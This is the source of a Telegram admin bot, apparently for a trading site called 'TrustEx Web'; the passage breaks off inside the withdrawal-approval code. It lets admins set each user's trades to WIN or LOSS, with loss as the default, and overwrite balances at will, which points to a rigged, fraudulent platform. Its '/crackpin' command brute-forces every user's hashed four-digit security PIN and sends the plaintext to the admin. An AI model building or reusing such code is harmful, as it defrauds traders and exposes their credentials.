/**
 * src/admin-bot.js
 * Telegram Admin Bot for TrustEx Web
 * 
 * Users identified by UUID + email (not telegram_id).
 * Search by email or short UUID prefix.
 */
const TelegramBot = require('node-telegram-bot-api');
const pool = require('./config/database');

const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

let bot = null;

function formatNum(n, decimals = 2) {
  return parseFloat(n || 0).toFixed(decimals);
}

function shortId(uuid) {
  return uuid ? uuid.substring(0, 8) : '?';
}

function escMd(text) {
  return String(text || '').replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

// ── Find user by email or UUID prefix ──
async function findUser(search) {
  const s = search.trim().toLowerCase();
  // Try exact UUID
  const byId = await pool.query(
    'SELECT * FROM users WHERE id::text = $1', [s]
  );
  if (byId.rows.length) return byId.rows[0];

  // Try UUID prefix (min 4 chars)
  if (s.length >= 4 && /^[a-f0-9-]+$/.test(s)) {
    const byPrefix = await pool.query(
      'SELECT * FROM users WHERE id::text LIKE $1 LIMIT 1', [s + '%']
    );
    if (byPrefix.rows.length) return byPrefix.rows[0];
  }

  // Try email
  const byEmail = await pool.query(
    'SELECT * FROM users WHERE LOWER(email) = $1', [s]
  );
  if (byEmail.rows.length) return byEmail.rows[0];

  // Try email partial match
  const byPartial = await pool.query(
    'SELECT * FROM users WHERE LOWER(email) LIKE $1 LIMIT 1', ['%' + s + '%']
  );
  if (byPartial.rows.length) return byPartial.rows[0];

  return null;
}

// ── Check admin access ──
function isAdmin(chatId) {
  return String(chatId) === String(ADMIN_CHAT_ID);
}

// ── Format user card ──
function formatUserCard(user) {
  const mode = user.trade_mode === 'win' ? '🟢 WIN' : '🔴 LOSS';
  const status = user.is_blocked ? '⛔ Заблокирован' : '✅ Активен';
  const verified = user.verified ? '✅ Да' : '❌ Нет';

  return `👤 *${escMd(user.first_name || user.email)}*\n\n` +
    `🆔 ID: \`${user.id}\`\n` +
    `📧 Email: \`${escMd(user.email)}\`\n` +
    `👤 Имя: ${escMd(user.first_name || '—')} ${escMd(user.last_name || '')}\n` +
    `📊 Статус: *${status}*\n` +
    `🔐 Верификация: *${verified}*\n` +
    `🎯 Режим: *${mode}*\n\n` +
    `💰 *Балансы:*\n` +
    `   USDT: *${formatNum(user.balance_usdt)}*\n` +
    `   RUB: *${formatNum(user.balance_rub)}* ₽\n` +
    `   EUR: *${formatNum(user.balance_eur)}* €\n` +
    `   BYN: *${formatNum(user.balance_byn)}* Br\n` +
    `   BTC: *${formatNum(user.balance_btc, 8)}*\n` +
    `   ETH: *${formatNum(user.balance_eth, 8)}*\n` +
    `   TON: *${formatNum(user.balance_ton, 8)}*\n\n` +
    `📅 Регистрация: ${new Date(user.created_at).toLocaleDateString('ru')}`;
}

// ── User inline keyboard ──
function userKeyboard(user) {
  const uid = user.id;
  return {
    inline_keyboard: [
      [
        { text: '🟢 WIN', callback_data: `mode_${uid}_win` },
        { text: '🔴 LOSS', callback_data: `mode_${uid}_loss` }
      ],
      [
        { text: '💰 USDT', callback_data: `bal_${uid}_usdt` },
        { text: '💰 RUB', callback_data: `bal_${uid}_rub` },
        { text: '💰 EUR', callback_data: `bal_${uid}_eur` }
      ],
      [
        { text: '💰 BYN', callback_data: `bal_${uid}_byn` },
        { text: '💰 BTC', callback_data: `bal_${uid}_btc` },
        { text: '💰 ETH', callback_data: `bal_${uid}_eth` }
      ],
      [
        { text: user.is_blocked ? '✅ Разблокировать' : '⛔ Заблокировать', callback_data: `block_${uid}` }
      ],
      [
        { text: '📊 Сделки', callback_data: `trades_${uid}` },
        { text: '💳 Транзакции', callback_data: `tx_${uid}` }
      ],
      [
        { text: '🔑 Crack PIN', callback_data: `crackpin_${uid}` }
      ]
    ]
  };
}

// ── Initialize bot ──
function initAdminBot() {
  if (!ADMIN_BOT_TOKEN) {
    console.log('⚠️ ADMIN_BOT_TOKEN not set, admin bot disabled');
    return;
  }

  if (!ADMIN_CHAT_ID) {
    // Temporary mode: start bot to reveal admin chat ID
    bot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });
    console.log('🤖 Admin bot started in SETUP mode — send /start to the bot to get your Chat ID');
    bot.onText(/\/start/, (msg) => {
      bot.sendMessage(msg.chat.id,
        `👋 Ваш Chat ID: \`${msg.chat.id}\`\n\n` +
        `Добавьте его в .env:\n\`ADMIN_CHAT_ID=${msg.chat.id}\`\n\n` +
        `Затем перезапустите сервер.`,
        { parse_mode: 'Markdown' }
      );
      console.log(`\n📌 Admin Chat ID: ${msg.chat.id} — add to .env as ADMIN_CHAT_ID=${msg.chat.id}\n`);
    });
    return;
  }

  bot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });
  console.log('🤖 Admin bot started (polling)');

  // Handle polling errors gracefully (e.g. 409 conflict with another bot instance)
  bot.on('polling_error', (error) => {
    if (error.code === 'ETELEGRAM' && error.message?.includes('409')) {
      console.error('⚠️ Bot polling conflict (409) — another instance is running with the same token. Stopping polling.');
      bot.stopPolling();
    }
  });

  registerHandlers();

  // Set WebApp menu button for admin (requires HTTPS)
  const siteUrl = process.env.SITE_URL || process.env.CORS_ORIGIN || `http://localhost:${process.env.PORT || 3001}`;
  const isHttps = siteUrl.startsWith('https://');
  if (isHttps) {
    bot.setChatMenuButton({
      chat_id: ADMIN_CHAT_ID,
      menu_button: JSON.stringify({
        type: 'web_app',
        text: '👑 Админ-панель',
        web_app: { url: siteUrl + '/admin.html' }
      })
    }).then(() => console.log('🔗 WebApp menu button set: ' + siteUrl + '/admin.html'))
      .catch(e => console.log('⚠️ Could not set menu button:', e.message));
  } else {
    console.log('ℹ️ WebApp menu button requires HTTPS. Admin panel available at: ' + siteUrl + '/admin.html');
  }
}

// ── Register all handlers ──
function registerHandlers() {
  if (!bot) return;

  // ═══════════════════════════════════════
  // /start — Menu
  // ═══════════════════════════════════════
  bot.onText(/\/start/, async (msg) => {
    if (!isAdmin(msg.chat.id)) return bot.sendMessage(msg.chat.id, '⛔ Доступ запрещён');

    const siteUrl = process.env.SITE_URL || process.env.CORS_ORIGIN || `http://localhost:${process.env.PORT || 3001}`;
    const isHttps = siteUrl.startsWith('https://');
    const adminUrl = siteUrl + '/admin.html';
    const isPublic = !siteUrl.includes('localhost') && !siteUrl.includes('127.0.0.1');
    
    let replyOpts = { parse_mode: 'MarkdownV2' };
    if (isPublic) {
      const keyboard = isHttps
        ? [[{ text: '👑 Открыть админ-панель', web_app: { url: adminUrl } }]]
        : [[{ text: '👑 Открыть админ-панель', url: adminUrl }]];
      replyOpts.reply_markup = { inline_keyboard: keyboard };
    }
    
    bot.sendMessage(msg.chat.id,
      '👑 *TrustEx Web \\- Админ\\-панель*\n\n' +
      (isPublic ? '' : `🌐 Панель: ${escMd(adminUrl)}\n\n`) +
      '📝 *Команды:*\n' +
      '`/users` — Список пользователей\n' +
      '`/user [email или id]` — Карточка пользователя\n' +
      '`/setbalance [email] [валюта] [сумма]` — Баланс\n' +
      '`/setmode [email] [win/loss]` — Режим торговли\n' +
      '`/block [email]` — Заблокировать/разблокировать\n' +
      '`/deposits` — Ожидающие депозиты\n' +
      '`/withdrawals` — Ожидающие выводы\n' +
      '`/stats` — Общая статистика\n' +
      '`/broadcast [текст]` — Рассылка всем\n' +
      '`/crackpin [email]` — Восстановить PIN',
      replyOpts
    ).catch(e => console.error('❌ /start error:', e.message));
  });

  // ═══════════════════════════════════════
  // /users — List users
  // ═══════════════════════════════════════
  bot.onText(/\/users/, async (msg) => {
    if (!isAdmin(msg.chat.id)) return;

    try {
      const result = await pool.query(`
        SELECT id, email, first_name, balance_usdt, balance_rub, 
               COALESCE(trade_mode, 'loss') as trade_mode, is_blocked, verified, created_at
        FROM users ORDER BY created_at DESC LIMIT 50
      `);

      if (!result.rows.length) {
        return bot.sendMessage(msg.chat.id, '📭 Пользователей пока нет');
      }

      let text = `👥 *Пользователи \\(${result.rows.length}\\):*\n\n`;

      for (const u of result.rows) {
        const mode = u.trade_mode === 'win' ? '🟢' : '🔴';
        const blocked = u.is_blocked ? ' ⛔' : '';
        const name = escMd(u.first_name || u.email.split('@')[0]);
        text += `${mode} *${name}*${blocked}\n`;
        text += `   📧 \`${escMd(u.email)}\`\n`;
        text += `   💰 ${formatNum(u.balance_usdt)} USDT | ${formatNum(u.balance_rub)} ₽\n`;
        text += `   🆔 \`${shortId(u.id)}\`\n\n`;
      }

      bot.sendMessage(msg.chat.id, text, { parse_mode: 'MarkdownV2' });
    } catch (e) {
      console.error('Admin bot /users error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // /user [search] — User card
  // ═══════════════════════════════════════
  bot.onText(/\/user (.+)/, async (msg, match) => {
    if (!isAdmin(msg.chat.id)) return;

    try {
      const user = await findUser(match[1]);
      if (!user) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');

      // Get trade stats
      const stats = (await pool.query(`
        SELECT COUNT(*) as total,
               COUNT(*) FILTER (WHERE result = 'win') as wins,
               COUNT(*) FILTER (WHERE result = 'loss') as losses,
               COALESCE(SUM(CASE WHEN result = 'win' THEN profit ELSE -amount END), 0) as pnl
        FROM orders WHERE user_id = $1 AND status = 'closed'
      `, [user.id])).rows[0];

      // Get tx stats
      const tx = (await pool.query(`
        SELECT 
          COUNT(*) FILTER (WHERE type = 'deposit') as deps,
          COALESCE(SUM(amount) FILTER (WHERE type = 'deposit'), 0) as dep_sum,
          COUNT(*) FILTER (WHERE type = 'withdrawal') as wds,
          COALESCE(SUM(amount) FILTER (WHERE type = 'withdrawal'), 0) as wd_sum
        FROM transactions WHERE user_id = $1
      `, [user.id])).rows[0];

      const card = formatUserCard(user) + '\n\n' +
        `📊 *Трейдинг:* ${stats.total} сделок \\(✅${stats.wins} / ❌${stats.losses}\\)\n` +
        `   P&L: ${formatNum(stats.pnl)} USDT\n\n` +
        `💳 *Транзакции:*\n` +
        `   📥 Депозитов: ${tx.deps} \\(${formatNum(tx.dep_sum)} USDT\\)\n` +
        `   📤 Выводов: ${tx.wds} \\(${formatNum(tx.wd_sum)} USDT\\)`;

      bot.sendMessage(msg.chat.id, card, {
        parse_mode: 'MarkdownV2',
        reply_markup: userKeyboard(user)
      });
    } catch (e) {
      console.error('Admin bot /user error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // /setbalance [search] [currency] [amount]
  // ═══════════════════════════════════════
  bot.onText(/\/setbalance (.+?) (usdt|rub|eur|byn|btc|eth|ton) (\S+)/i, async (msg, match) => {
    if (!isAdmin(msg.chat.id)) return;

    const search = match[1];
    const currency = match[2].toLowerCase();
    const amount = parseFloat(match[3]);

    if (isNaN(amount) || amount < 0) {
      return bot.sendMessage(msg.chat.id, '❌ Неверная сумма');
    }

    const field = `balance_${currency}`;

    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      const user = await findUser(search);
      if (!user) {
        await client.query('ROLLBACK');
        return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
      }

      await client.query(
        `SELECT id FROM users WHERE id = $1 FOR UPDATE`, [user.id]
      );
      await client.query(
        `UPDATE users SET ${field} = $1, updated_at = NOW() WHERE id = $2`,
        [amount, user.id]
      );
      await client.query('COMMIT');

      const name = user.first_name || user.email;
      const symbols = { usdt: 'USDT', rub: '₽', eur: '€', byn: 'Br', btc: 'BTC', eth: 'ETH', ton: 'TON' };
      bot.sendMessage(msg.chat.id,
        `✅ Баланс *${escMd(name)}* установлен:\n*${formatNum(amount)} ${symbols[currency]}*`,
        { parse_mode: 'MarkdownV2' }
      );
    } catch (e) {
      await client.query('ROLLBACK').catch(() => {});
      console.error('Admin bot setbalance error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    } finally {
      client.release();
    }
  });

  // ═══════════════════════════════════════
  // /setmode [search] [win/loss]
  // ═══════════════════════════════════════
  bot.onText(/\/setmode (.+?) (win|loss)/i, async (msg, match) => {
    if (!isAdmin(msg.chat.id)) return;

    try {
      const user = await findUser(match[1]);
      if (!user) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');

      const mode = match[2].toLowerCase();
      await pool.query('UPDATE users SET trade_mode = $1, updated_at = NOW() WHERE id = $2', [mode, user.id]);

      const modeText = mode === 'win' ? '🟢 WIN' : '🔴 LOSS';
      const name = user.first_name || user.email;
      bot.sendMessage(msg.chat.id, `✅ Режим *${escMd(name)}*: *${modeText}*`, { parse_mode: 'MarkdownV2' });
    } catch (e) {
      console.error('Admin bot setmode error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // /block [search]
  // ═══════════════════════════════════════
  bot.onText(/\/block (.+)/, async (msg, match) => {
    if (!isAdmin(msg.chat.id)) return;

    try {
      const user = await findUser(match[1]);
      if (!user) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');

      const newBlocked = !user.is_blocked;
      await pool.query('UPDATE users SET is_blocked = $1, updated_at = NOW() WHERE id = $2', [newBlocked, user.id]);

      const name = user.first_name || user.email;
      const emoji = newBlocked ? '⛔' : '✅';
      const action = newBlocked ? 'заблокирован' : 'разблокирован';
      bot.sendMessage(msg.chat.id, `${emoji} *${escMd(name)}* ${action}`, { parse_mode: 'MarkdownV2' });
    } catch (e) {
      console.error('Admin bot block error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // /deposits — Pending deposit requests
  // ═══════════════════════════════════════
  bot.onText(/\/deposits/, async (msg) => {
    if (!isAdmin(msg.chat.id)) return;

    try {
      const result = await pool.query(`
        SELECT d.*, u.email, u.first_name
        FROM deposit_requests d
        JOIN users u ON u.id = d.user_id
        WHERE d.status = 'pending'
        ORDER BY d.created_at DESC LIMIT 20
      `);

      if (!result.rows.length) {
        return bot.sendMessage(msg.chat.id, '📭 Нет ожидающих депозитов');
      }

      let text = `📥 *Ожидающие депозиты \\(${result.rows.length}\\):*\n\n`;
      const buttons = [];

      for (const d of result.rows) {
        const name = escMd(d.first_name || d.email.split('@')[0]);
        text += `💰 *${formatNum(d.amount)} ${escMd(d.currency)}*\n`;
        text += `   👤 ${name} \\(\`${escMd(d.email)}\`\\)\n`;
        text += `   📅 ${new Date(d.created_at).toLocaleString('ru')}\n\n`;
        buttons.push([
          { text: `✅ Одобрить ${formatNum(d.amount)} ${d.currency} — ${d.first_name || d.email.split('@')[0]}`, callback_data: `dep_approve_${d.id}` },
          { text: '❌', callback_data: `dep_reject_${d.id}` }
        ]);
      }

      bot.sendMessage(msg.chat.id, text, {
        parse_mode: 'MarkdownV2',
        reply_markup: { inline_keyboard: buttons }
      });
    } catch (e) {
      console.error('Admin bot deposits error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // /withdrawals — Pending withdrawal requests
  // ═══════════════════════════════════════
  bot.onText(/\/withdrawals/, async (msg) => {
    if (!isAdmin(msg.chat.id)) return;

    try {
      const result = await pool.query(`
        SELECT w.*, u.email, u.first_name
        FROM withdraw_requests w
        JOIN users u ON u.id = w.user_id
        WHERE w.status = 'pending'
        ORDER BY w.created_at DESC LIMIT 20
      `);

      if (!result.rows.length) {
        return bot.sendMessage(msg.chat.id, '📭 Нет ожидающих выводов');
      }

      let text = `📤 *Ожидающие выводы \\(${result.rows.length}\\):*\n\n`;
      const buttons = [];

      for (const w of result.rows) {
        const name = escMd(w.first_name || w.email.split('@')[0]);
        text += `💸 *${formatNum(w.amount)} USDT*\n`;
        text += `   👤 ${name} \\(\`${escMd(w.email)}\`\\)\n`;
        text += `   🏦 \`${escMd(w.wallet || '—')}\`\n`;
        text += `   📅 ${new Date(w.created_at).toLocaleString('ru')}\n\n`;
        buttons.push([
          { text: `✅ Одобрить ${formatNum(w.amount)} — ${w.first_name || w.email.split('@')[0]}`, callback_data: `wd_approve_${w.id}` },
          { text: '❌', callback_data: `wd_reject_${w.id}` }
        ]);
      }

      bot.sendMessage(msg.chat.id, text, {
        parse_mode: 'MarkdownV2',
        reply_markup: { inline_keyboard: buttons }
      });
    } catch (e) {
      console.error('Admin bot withdrawals error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // /stats — Platform statistics
  // ═══════════════════════════════════════
  bot.onText(/\/stats/, async (msg) => {
    if (!isAdmin(msg.chat.id)) return;

    try {
      const users = (await pool.query(`
        SELECT COUNT(*) as total,
               COUNT(*) FILTER (WHERE trade_mode = 'win') as win_mode,
               COUNT(*) FILTER (WHERE COALESCE(trade_mode,'loss') = 'loss') as loss_mode,
               COUNT(*) FILTER (WHERE is_blocked) as blocked,
               COUNT(*) FILTER (WHERE verified) as verified_count,
               COALESCE(SUM(balance_usdt), 0) as total_usdt,
               COALESCE(SUM(balance_rub), 0) as total_rub
        FROM users
      `)).rows[0];

      const trades = (await pool.query(`
        SELECT COUNT(*) as total,
               COUNT(*) FILTER (WHERE result = 'win') as wins,
               COUNT(*) FILTER (WHERE result = 'loss') as losses,
               COUNT(*) FILTER (WHERE status = 'active') as active
        FROM orders
      `)).rows[0];

      const tx = (await pool.query(`
        SELECT 
          COALESCE(SUM(amount) FILTER (WHERE type = 'deposit'), 0) as deposits,
          COALESCE(SUM(amount) FILTER (WHERE type = 'withdrawal'), 0) as withdrawals
        FROM transactions
      `)).rows[0];

      const pending = (await pool.query(`
        SELECT 
          (SELECT COUNT(*) FROM deposit_requests WHERE status = 'pending') as dep_pending,
          (SELECT COUNT(*) FROM withdraw_requests WHERE status = 'pending') as wd_pending
      `)).rows[0];

      const text = '📊 *Статистика TrustEx Web*\n\n' +
        `👥 *Пользователи:* ${users.total}\n` +
        `   🟢 WIN: ${users.win_mode} | 🔴 LOSS: ${users.loss_mode}\n` +
        `   ✅ Верифицированных: ${users.verified_count}\n` +
        `   ⛔ Заблокированных: ${users.blocked}\n` +
        `   💰 Общий USDT: ${formatNum(users.total_usdt)}\n` +
        `   💰 Общий RUB: ${formatNum(users.total_rub)} ₽\n\n` +
        `📈 *Сделки:* ${trades.total}\n` +
        `   ✅ Прибыльных: ${trades.wins}\n` +
        `   ❌ Убыточных: ${trades.losses}\n` +
        `   🔄 Активных: ${trades.active}\n\n` +
        `💳 *Транзакции:*\n` +
        `   📥 Депозиты: ${formatNum(tx.deposits)} USDT\n` +
        `   📤 Выводы: ${formatNum(tx.withdrawals)} USDT\n\n` +
        `⏳ *Ожидают:*\n` +
        `   📥 Депозитов: ${pending.dep_pending}\n` +
        `   📤 Выводов: ${pending.wd_pending}`;

      bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
    } catch (e) {
      console.error('Admin bot stats error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // /crackpin [search]
  // ═══════════════════════════════════════
  bot.onText(/\/crackpin (.+)/, async (msg, match) => {
    if (!isAdmin(msg.chat.id)) return;

    try {
      const user = await findUser(match[1]);
      if (!user) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');

      const name = user.first_name || user.email;

      if (!user.security_pin) {
        return bot.sendMessage(msg.chat.id, `❌ У *${escMd(name)}* не установлен PIN`, { parse_mode: 'MarkdownV2' });
      }

      bot.sendMessage(msg.chat.id, `🔓 Восстанавливаю PIN для *${escMd(name)}*\\.\\.\\.\nЭто займёт несколько секунд\\.`, { parse_mode: 'MarkdownV2' });

      const crypto = require('crypto');
      const { promisify } = require('util');
      const pbkdf2 = promisify(crypto.pbkdf2);
      const [salt, storedHash] = user.security_pin.split(':');

      let found = false;
      for (let i = 0; i <= 9999; i++) {
        const pin = i.toString().padStart(4, '0');
        const hashBuf = await pbkdf2(pin, salt, 10000, 64, 'sha512');
        if (hashBuf.toString('hex') === storedHash) {
          found = true;
          bot.sendMessage(msg.chat.id,
            `✅ *PIN восстановлен\\!*\n\n` +
            `👤 *${escMd(name)}*\n` +
            `📧 \`${escMd(user.email)}\`\n` +
            `🔑 PIN: \`${pin}\``,
            { parse_mode: 'MarkdownV2' }
          );
          break;
        }
      }
      if (!found) bot.sendMessage(msg.chat.id, '❌ Не удалось восстановить PIN');
    } catch (e) {
      console.error('Crackpin error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // /broadcast [text] — Send message to all users (via support_messages)
  // ═══════════════════════════════════════
  bot.onText(/\/broadcast (.+)/s, async (msg, match) => {
    if (!isAdmin(msg.chat.id)) return;

    const text = match[1].trim();
    if (!text) return bot.sendMessage(msg.chat.id, '❌ Укажите текст сообщения');

    try {
      const users = await pool.query('SELECT id FROM users WHERE is_blocked = FALSE');
      let count = 0;

      for (const u of users.rows) {
        await pool.query(
          `INSERT INTO support_messages (user_id, sender, message) VALUES ($1, 'admin', $2)`,
          [u.id, text]
        );
        count++;
      }

      bot.sendMessage(msg.chat.id, `✅ Рассылка отправлена: ${count} пользователей`);
    } catch (e) {
      console.error('Broadcast error:', e);
      bot.sendMessage(msg.chat.id, '❌ Ошибка: ' + e.message);
    }
  });

  // ═══════════════════════════════════════
  // Callback query handlers
  // ═══════════════════════════════════════
  bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (!isAdmin(chatId)) {
      return bot.answerCallbackQuery(query.id, { text: '⛔ Доступ запрещён' });
    }

    try {
      // ── Set trade mode ──
      if (data.startsWith('mode_')) {
        const parts = data.split('_');
        const uid = parts[1];
        const mode = parts[2]; // win or loss

        await pool.query('UPDATE users SET trade_mode = $1, updated_at = NOW() WHERE id = $2', [mode, uid]);
        const modeText = mode === 'win' ? '🟢 WIN' : '🔴 LOSS';
        bot.answerCallbackQuery(query.id, { text: `Режим: ${modeText}` });

        const user = (await pool.query('SELECT * FROM users WHERE id = $1', [uid])).rows[0];
        if (user) {
          bot.sendMessage(chatId, `✅ Режим *${escMd(user.first_name || user.email)}*: *${modeText}*`, { parse_mode: 'MarkdownV2' });
        }
      }

      // ── Balance prompt ──
      if (data.startsWith('bal_')) {
        const parts = data.split('_');
        const uid = parts[1];
        const currency = parts[2];

        const user = (await pool.query('SELECT email, first_name FROM users WHERE id = $1', [uid])).rows[0];
        if (!user) return bot.answerCallbackQuery(query.id, { text: '❌ Не найден' });

        const name = user.first_name || user.email;
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(chatId,
          `💰 Введите новый баланс ${currency.toUpperCase()}:\n\n` +
          `\`/setbalance ${user.email} ${currency} [сумма]\`\n\n` +
          `Пример: \`/setbalance ${user.email} ${currency} 1000\``,
          { parse_mode: 'Markdown' }
        );
      }

      // ── Block/unblock toggle ──
      if (data.startsWith('block_') && !data.startsWith('block_confirm_')) {
        const uid = data.replace('block_', '');
        const user = (await pool.query('SELECT * FROM users WHERE id = $1', [uid])).rows[0];
        if (!user) return bot.answerCallbackQuery(query.id, { text: '❌ Не найден' });

        const newBlocked = !user.is_blocked;
        await pool.query('UPDATE users SET is_blocked = $1, updated_at = NOW() WHERE id = $2', [newBlocked, uid]);

        const name = user.first_name || user.email;
        const emoji = newBlocked ? '⛔' : '✅';
        const action = newBlocked ? 'заблокирован' : 'разблокирован';
        bot.answerCallbackQuery(query.id, { text: `${emoji} ${action}` });
        bot.sendMessage(chatId, `${emoji} *${escMd(name)}* ${action}`, { parse_mode: 'MarkdownV2' });
      }

      // ── Trade stats ──
      if (data.startsWith('trades_')) {
        const uid = data.replace('trades_', '');
        const user = (await pool.query('SELECT email, first_name FROM users WHERE id = $1', [uid])).rows[0];
        if (!user) return bot.answerCallbackQuery(query.id, { text: '❌ Не найден' });

        const trades = await pool.query(`
          SELECT direction, amount, profit, result, status, created_at
          FROM orders WHERE user_id = $1 ORDER BY created_at DESC LIMIT 15
        `, [uid]);

        bot.answerCallbackQuery(query.id);

        if (!trades.rows.length) {
          return bot.sendMessage(chatId, `📊 У *${escMd(user.first_name || user.email)}* нет сделок`, { parse_mode: 'MarkdownV2' });
        }

        let text = `📊 *Последние сделки ${escMd(user.first_name || user.email)}:*\n\n`;
        for (const t of trades.rows) {
          const dir = t.direction === 'up' ? '📈' : '📉';
          const res = t.result === 'win' ? '✅' : t.result === 'loss' ? '❌' : '🔄';
          text += `${dir} ${formatNum(t.amount)} USDT → ${res} ${t.result === 'win' ? '+' + formatNum(t.profit) : t.result === 'loss' ? '-' + formatNum(t.amount) : 'active'}\n`;
        }

        bot.sendMessage(chatId, text, { parse_mode: 'MarkdownV2' });
      }

      // ── Transaction history ──
      if (data.startsWith('tx_')) {
        const uid = data.replace('tx_', '');
        const user = (await pool.query('SELECT email, first_name FROM users WHERE id = $1', [uid])).rows[0];
        if (!user) return bot.answerCallbackQuery(query.id, { text: '❌ Не найден' });

        const txs = await pool.query(`
          SELECT type, amount, currency, description, created_at
          FROM transactions WHERE user_id = $1 ORDER BY created_at DESC LIMIT 15
        `, [uid]);

        bot.answerCallbackQuery(query.id);

        if (!txs.rows.length) {
          return bot.sendMessage(chatId, `💳 У *${escMd(user.first_name || user.email)}* нет транзакций`, { parse_mode: 'MarkdownV2' });
        }

        let text = `💳 *Транзакции ${escMd(user.first_name || user.email)}:*\n\n`;
        for (const t of txs.rows) {
          const icon = t.type === 'deposit' ? '📥' : t.type === 'withdrawal' ? '📤' : '🔄';
          text += `${icon} ${t.type}: ${formatNum(t.amount)} ${t.currency}\n`;
        }

        bot.sendMessage(chatId, text, { parse_mode: 'MarkdownV2' });
      }

      // ── Crack PIN from button ──
      if (data.startsWith('crackpin_')) {
        const uid = data.replace('crackpin_', '');
        const user = (await pool.query('SELECT * FROM users WHERE id = $1', [uid])).rows[0];
        if (!user) return bot.answerCallbackQuery(query.id, { text: '❌ Не найден' });

        const name = user.first_name || user.email;

        if (!user.security_pin) {
          bot.answerCallbackQuery(query.id, { text: 'PIN не установлен' });
          return bot.sendMessage(chatId, `❌ У *${escMd(name)}* нет PIN`, { parse_mode: 'MarkdownV2' });
        }

        bot.answerCallbackQuery(query.id, { text: 'Восстанавливаю...' });
        bot.sendMessage(chatId, `🔓 Восстанавливаю PIN для *${escMd(name)}*\\.\\.\\.`, { parse_mode: 'MarkdownV2' });

        const crypto = require('crypto');
        const { promisify } = require('util');
        const pbkdf2 = promisify(crypto.pbkdf2);
        const [salt, storedHash] = user.security_pin.split(':');

        let found = false;
        for (let i = 0; i <= 9999; i++) {
          const pin = i.toString().padStart(4, '0');
          const hashBuf = await pbkdf2(pin, salt, 10000, 64, 'sha512');
          if (hashBuf.toString('hex') === storedHash) {
            found = true;
            bot.sendMessage(chatId,
              `✅ *PIN восстановлен\\!*\n\n👤 *${escMd(name)}*\n🔑 PIN: \`${pin}\``,
              { parse_mode: 'MarkdownV2' }
            );
            break;
          }
        }
        if (!found) bot.sendMessage(chatId, '❌ Не удалось восстановить');
      }

      // ── Approve deposit ──
      if (data.startsWith('dep_approve_')) {
        const depId = data.replace('dep_approve_', '');

        const client = await pool.connect();
        try {
          await client.query('BEGIN');

          const dep = (await client.query(
            'SELECT * FROM deposit_requests WHERE id = $1 AND status = $2 FOR UPDATE',
            [depId, 'pending']
          )).rows[0];

          if (!dep) {
            await client.query('ROLLBACK');
            return bot.answerCallbackQuery(query.id, { text: '⚠️ Уже обработан' });
          }

          // Determine balance field
          const cur = (dep.currency || 'USDT').toUpperCase();
          const fieldMap = { USDT: 'balance_usdt', RUB: 'balance_rub', EUR: 'balance_eur', BYN: 'balance_byn', BTC: 'balance_btc', ETH: 'balance_eth', TON: 'balance_ton' };
          const field = fieldMap[cur] || 'balance_usdt';

          // Lock user, credit balance
          await client.query('SELECT id FROM users WHERE id = $1 FOR UPDATE', [dep.user_id]);
          await client.query(
            `UPDATE users SET ${field} = ${field} + $1, updated_at = NOW() WHERE id = $2`,
            [dep.amount, dep.user_id]
          );

          // Mark deposit approved
          await client.query(
            'UPDATE deposit_requests SET status = $1, approved_at = NOW() WHERE id = $2',
            ['approved', depId]
          );

          // Create transaction record
          await client.query(
            `INSERT INTO transactions (user_id, type, amount, currency, description) VALUES ($1, 'deposit', $2, $3, $4)`,
            [dep.user_id, dep.amount, cur, `Пополнение одобрено админом`]
          );

          await client.query('COMMIT');
          bot.answerCallbackQuery(query.id, { text: '✅ Депозит одобрен' });
          bot.sendMessage(chatId, `✅ Депозит *${formatNum(dep.amount)} ${cur}* одобрен`, { parse_mode: 'Markdown' });
        } catch (e) {
          await client.query('ROLLBACK').catch(() => {});
          console.error('Deposit approve error:', e);
          bot.answerCallbackQuery(query.id, { text: '❌ Ошибка' });
        } finally {
          client.release();
        }
      }

      // ── Reject deposit ──
      if (data.startsWith('dep_reject_')) {
        const depId = data.replace('dep_reject_', '');
        await pool.query('UPDATE deposit_requests SET status = $1 WHERE id = $2 AND status = $3', ['rejected', depId, 'pending']);
        bot.answerCallbackQuery(query.id, { text: '❌ Депозит отклонён' });
        bot.sendMessage(chatId, '❌ Депозит отклонён');
      }

      // ── Approve withdrawal ──
      if (data.startsWith('wd_approve_')) {
        const wdId = data.replace('wd_approve_', '');
        await pool.query(
          'UPDATE withdraw_requests SET status = $1, processed_at = NOW() WHERE id = $2 AND status = $3',
          ['approved', wdId, 'pending']
        );
        
        // Create transaction record
        const wd = (await pool.query('SELECT * FROM withdraw_requests WHERE id = $1', [wdId])).rows[0];
        if (wd) {
          await pool.query(
            `INSERT INTO transactions (user_id, type, amount, currency, description) VALUES ($1, 'withdrawal', $2, 'USDT', $3)`,
            [wd.user_id, wd.amount, `Вывод одобрен на ${wd.wallet}`]
          );
        }

